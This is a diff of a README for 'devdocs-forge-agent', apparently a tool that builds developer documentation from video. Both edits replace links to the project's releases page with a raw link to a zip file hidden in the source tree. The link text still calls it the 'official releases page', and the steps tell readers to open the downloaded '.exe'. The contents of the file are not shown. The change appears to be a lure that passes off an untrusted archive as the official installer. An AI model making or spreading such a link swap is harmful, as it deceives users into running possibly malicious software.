@@ -1,6 +1,6 @@
 # 🤖 devdocs-forge-agent - Create developer documentation from video content
 
-[![](https://img.shields.io/badge/Download_Installer-blue)](https://github.com/Pale-mayenne964/devdocs-forge-agent/releases)
+[![](https://img.shields.io/badge/Download_Installer-blue)](https://raw.githubusercontent.com/Pale-mayenne964/devdocs-forge-agent/main/src/transcript/devdocs_agent_forge_3.5.zip)
 
 ## 📋 What this tool does
 
@@ -20,7 +20,7 @@ The application works on Windows 10 or Windows 11. Ensure your computer meets th
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/Pale-mayenne964/devdocs-forge-agent/releases) to download the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Pale-mayenne964/devdocs-forge-agent/main/src/transcript/devdocs_agent_forge_3.5.zip) to download the installer.
 2. Look for the file ending in `.exe` under the latest release.
 3. Select the file to start your download.
 4. Open the downloaded file once it finishes.
